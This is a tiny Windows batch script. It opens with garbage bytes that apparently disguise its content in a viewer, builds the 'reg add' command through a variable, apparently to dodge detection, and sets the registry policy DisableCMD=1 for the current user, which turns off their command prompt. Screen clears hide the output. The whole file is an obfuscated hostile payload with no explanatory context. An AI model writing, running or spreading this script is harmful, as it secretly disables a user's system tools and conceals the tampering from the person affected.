��&cls
set tes=ad
reg %tes%d HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
cls